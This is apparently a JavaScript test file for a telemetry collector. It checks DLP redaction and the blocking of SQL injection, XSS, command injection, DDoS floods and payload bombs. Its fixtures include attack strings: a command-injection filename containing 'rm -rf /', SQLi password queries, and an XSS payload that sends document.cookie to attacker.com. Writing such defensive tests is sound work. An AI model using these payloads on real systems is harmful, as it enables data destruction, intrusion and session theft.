import test from 'node:test';
import assert from 'node:assert/strict';
import {
  LocalCollector,
  ATTACK_TYPES,
  LEAK_TYPES,
  calculateObjectDepth,
  computeStructuralFingerprint,
} from '../src/lib/localCollector.js';
import {
  resetTenantStore,
  queryTenant,
} from '../src/lib/saasEngine.js';
import { analyzeTenantOps } from '../src/lib/aiopsEngine.js';

test.beforeEach(() => {
  resetTenantStore();
});

test('1. Raw data filtering: Strips all raw user payloads and forwards only safe telemetry metadata', () => {
  const collector = new LocalCollector({ collectorToken: 'collector-alpha-token' });

  const rawUserInput = {
    tenantId: 'tenant-privacy-test',
    region: 'us-east-1',
    sourceAlias: 'web-checkout-client',
    // Sensitive raw user data that must never be sent
    rawBody: 'User clicked buy on product #9812 with billing address 123 Main St',
    userMessage: 'Hello, please help with my order',
    personalProfile: {
      bio: 'Loves coding and security',
      preferences: { theme: 'dark', language: 'en-US' },
    },
    // Safe operational indicators
    latencyMs: 145,
    statusCode: 200,
    metrics: {
      cacheHit: 1,
      itemCount: 3,
    },
  };

  const result = collector.processUserInput(rawUserInput);

  assert.equal(result.status, 'accepted');
  assert.ok(result.payloadId);

  // Verify metadata payload structure
  const meta = result.metadata;
  assert.equal(meta.tenantId, 'tenant-privacy-test');
  assert.equal(meta.region, 'us-east-1');
  assert.equal(meta.sourceAlias, 'web-checkout-client');
  assert.equal(meta.category, 'collector');

  // Verify RAW fields are COMPLETELY stripped
  assert.equal(meta.rawBody, undefined);
  assert.equal(meta.userMessage, undefined);
  assert.equal(meta.personalProfile, undefined);
  assert.equal(meta.preferences, undefined);

  // Verify extracted operational metadata
  assert.ok(typeof meta.metrics.payloadSizeRawBytes === 'number');
  assert.ok(meta.metrics.fieldsStrippedCount >= 6);
  assert.ok(typeof meta.metrics.structuralFingerprint === 'string');
  assert.equal(meta.metrics.latencyMs, 145);
  assert.equal(meta.metrics.statusCode, 200);
  assert.equal(meta.metrics.cacheHit, 1);
  assert.equal(meta.metrics.itemCount, 3);

  // Verify upstream tenant partition received pure metadata without raw fields
  const tenantData = queryTenant('tenant-privacy-test');
  assert.equal(tenantData.events.length, 1);
  const upstreamEvent = tenantData.events[0];
  assert.equal(upstreamEvent.rawBody, undefined);
  assert.equal(upstreamEvent.userMessage, undefined);
  assert.equal(upstreamEvent.personalProfile, undefined);
});

test('2. Data Loss Prevention (DLP): Detects and neutralizes API keys, Bearer tokens, private keys, passwords, and PII', () => {
  const collector = new LocalCollector();

  const leakingPayload = {
    tenantId: 'tenant-leak-shield',
    region: 'us-west-2',
    sourceAlias: 'mobile-app',
    userForm: {
      userApiKey: 'sk-abcdef1234567890abcdef123456',
      authHeader: 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.t-IDcSemACt8x4iTMCda8Yhe3iZaWbvV5XKSTbuAn0M',
      adminPassword: 'SuperSecretMasterPassword123!',
      userSsn: '987-65-4321',
      creditCard: '4532-1234-5678-9010',
      contactEmail: 'security-breach@example.com',
    },
  };

  const result = collector.processUserInput(leakingPayload);

  assert.equal(result.status, 'accepted');
  assert.ok(result.leaksPrevented >= 5);
  assert.equal(result.metadata.category, 'security');
  assert.equal(result.metadata.severity, 'critical');
  assert.ok(result.metadata.summary.includes('[DLP Alert]'));

  // Ensure NO credentials leaked into metadata
  const stringifiedMeta = JSON.stringify(result.metadata);
  assert.equal(stringifiedMeta.includes('sk-abcdef'), false);
  assert.equal(stringifiedMeta.includes('SuperSecretMasterPassword123!'), false);
  assert.equal(stringifiedMeta.includes('987-65-4321'), false);
  assert.equal(stringifiedMeta.includes('4532-1234-5678-9010'), false);

  // Check stats
  const stats = collector.getSecurityStats();
  assert.ok(stats.leaksPrevented >= 5);
  assert.ok(stats.leakBreakdown[LEAK_TYPES.API_KEY] >= 1);
  assert.ok(stats.leakBreakdown[LEAK_TYPES.PASSWORD] >= 1);
  assert.ok(stats.leakBreakdown[LEAK_TYPES.SSN] >= 1);
});

test('3. Big attacks: SQL Injection (SQLi) attacks are blocked and logged as security incidents', () => {
  const collector = new LocalCollector();

  const sqlAttackPayload = {
    tenantId: 'tenant-sqli-target',
    region: 'eu-west-1',
    sourceAlias: 'untrusted-client',
    query: "SELECT * FROM users WHERE username = 'admin' OR '1'='1' --",
  };

  const result = collector.processUserInput(sqlAttackPayload);

  assert.equal(result.status, 'blocked');
  assert.equal(result.attackType, ATTACK_TYPES.SQL_INJECTION);
  assert.equal(result.statusCode, 403);
  assert.equal(result.securityEvent.category, 'security');
  assert.equal(result.securityEvent.severity, 'critical');

  const stats = collector.getSecurityStats();
  assert.equal(stats.attacksBlocked, 1);
  assert.equal(stats.attackBreakdown[ATTACK_TYPES.SQL_INJECTION], 1);

  // Verify the security alert was ingested upstream into tenant partition
  const tenantData = queryTenant('tenant-sqli-target');
  assert.equal(tenantData.events.length, 1);
  assert.equal(tenantData.events[0].severity, 'critical');
  assert.equal(tenantData.events[0].category, 'security');
});

test('4. Big attacks: Cross-Site Scripting (XSS) and Command Injection attacks are neutralized', () => {
  const collector = new LocalCollector();

  // Test 4a: XSS
  const xssPayload = {
    tenantId: 'tenant-xss-target',
    comment: '<script>alert(document.cookie)</script>',
  };
  const xssResult = collector.processUserInput(xssPayload);
  assert.equal(xssResult.status, 'blocked');
  assert.equal(xssResult.attackType, ATTACK_TYPES.XSS_ATTACK);

  // Test 4b: Command Injection
  const rcePayload = {
    tenantId: 'tenant-rce-target',
    filename: '; rm -rf / ; whoami',
  };
  const rceResult = collector.processUserInput(rcePayload);
  assert.equal(rceResult.status, 'blocked');
  assert.equal(rceResult.attackType, ATTACK_TYPES.COMMAND_INJECTION);

  const stats = collector.getSecurityStats();
  assert.equal(stats.attacksBlocked, 2);
});

test('5. Big attacks: Volumetric flood / DDoS attack detection and sliding window rate limiting', () => {
  const collector = new LocalCollector({
    maxRequestsPerWindow: 5,
    surgeThreshold: 10,
    rateLimitWindowMs: 10000,
  });

  const clientIp = '198.51.100.42';
  const now = Date.now();

  // Send 5 permitted requests
  for (let i = 0; i < 5; i++) {
    const res = collector.processUserInput({ tenantId: 'tenant-ddos', ip: clientIp }, { clientIp, now: now + i });
    assert.equal(res.status, 'accepted');
  }

  // Request 6 exceeds standard rate limit
  const rateLimitRes = collector.processUserInput({ tenantId: 'tenant-ddos', ip: clientIp }, { clientIp, now: now + 10 });
  assert.equal(rateLimitRes.status, 'blocked');
  assert.equal(rateLimitRes.statusCode, 429);
  assert.equal(rateLimitRes.attackType, ATTACK_TYPES.RATE_LIMIT_EXCEEDED);

  // Send requests up past surgeThreshold (10) to trigger full DDoS defense
  for (let i = 6; i < 11; i++) {
    collector.processUserInput({ tenantId: 'tenant-ddos', ip: clientIp }, { clientIp, now: now + i });
  }

  const ddosRes = collector.processUserInput({ tenantId: 'tenant-ddos', ip: clientIp }, { clientIp, now: now + 15 });
  assert.equal(ddosRes.status, 'blocked');
  assert.equal(ddosRes.statusCode, 403);
  assert.equal(ddosRes.attackType, ATTACK_TYPES.DDOS_FLOOD);
  assert.equal(ddosRes.securityEvent.severity, 'critical');

  const stats = collector.getSecurityStats();
  assert.ok(stats.attacksBlocked >= 2);
  assert.ok(stats.attackBreakdown[ATTACK_TYPES.DDOS_FLOOD] >= 1);
});

test('6. Big attacks: Payload bombs (oversized payloads & deeply nested JSON) are rejected', () => {
  const collector = new LocalCollector({
    maxPayloadSizeBytes: 1024, // 1 KB limit for test
  });

  // Test 6a: Oversized payload
  const oversizedData = {
    tenantId: 'tenant-bomb',
    blob: 'A'.repeat(2048),
  };
  const sizeRes = collector.processUserInput(oversizedData);
  assert.equal(sizeRes.status, 'blocked');
  assert.equal(sizeRes.statusCode, 413);
  assert.equal(sizeRes.attackType, ATTACK_TYPES.PAYLOAD_BOMB);

  // Test 6b: Deeply nested JSON expansion bomb
  let nested = { val: 'deep' };
  for (let i = 0; i < 15; i++) {
    nested = { child: nested };
  }
  const nestedData = {
    tenantId: 'tenant-bomb',
    data: nested,
  };
  const depthRes = collector.processUserInput(nestedData);
  assert.equal(depthRes.status, 'blocked');
  assert.equal(depthRes.statusCode, 400);
  assert.equal(depthRes.attackType, ATTACK_TYPES.PAYLOAD_BOMB);
});

test('7. Batch processing and local buffer drainage forward cleanly to upstream engine', () => {
  const collector = new LocalCollector();

  const batch = [
    {
      tenantId: 'tenant-batch-test',
      region: 'us-east-1',
      sourceAlias: 'worker-1',
      rawText: 'Valid event 1',
      metrics: { latencyMs: 50 },
    },
    {
      tenantId: 'tenant-batch-test',
      region: 'us-east-1',
      sourceAlias: 'worker-2',
      rawText: 'Valid event 2',
      metrics: { latencyMs: 80 },
    },
    {
      tenantId: 'tenant-batch-test',
      region: 'us-east-1',
      sourceAlias: 'attacker',
      sql: 'UNION ALL SELECT 1, 2, password FROM users', // blocked
    },
  ];

  const batchSummary = collector.processBatch(batch);
  assert.equal(batchSummary.total, 3);
  assert.equal(batchSummary.accepted, 2);
  assert.equal(batchSummary.blocked, 1);
  assert.equal(batchSummary.upstreamSummary.accepted, 2);

  const tenantData = queryTenant('tenant-batch-test');
  assert.equal(tenantData.events.length, 2);
});

test('8. End-to-end synergy: Collector blocked attacks flow into AIOps for instant RCA and runbooks', () => {
  const collector = new LocalCollector();
  const tenantId = 'tenant-synergy-aiops';

  // Ingest attack via collector
  collector.processUserInput({
    tenantId,
    region: 'us-east-1',
    sourceAlias: 'edge-proxy',
    maliciousScript: '<script>fetch("http://attacker.com/steal?data="+document.cookie)</script>',
  });

  // Run AIOps analysis on the tenant partition
  const aiopsReport = analyzeTenantOps(tenantId);

  assert.equal(aiopsReport.tenantId, tenantId);
  assert.equal(aiopsReport.summary.totalEventsAnalyzed, 1);
  assert.ok(aiopsReport.healthScore < 80);
  assert.equal(aiopsReport.healthStatus, 'DEGRADED');
  assert.equal(aiopsReport.incidents.length, 1);

  const incident = aiopsReport.incidents[0];
  assert.equal(incident.severity, 'critical');
  assert.equal(incident.category, 'security');
  assert.ok(incident.rca.probableRootCause.includes('SECURITY'));

  // Prescriptive runbooks contain edge blocking
  assert.ok(aiopsReport.recommendations.some((r) => r.action === 'APPLY_EDGE_RATE_LIMIT'));
});
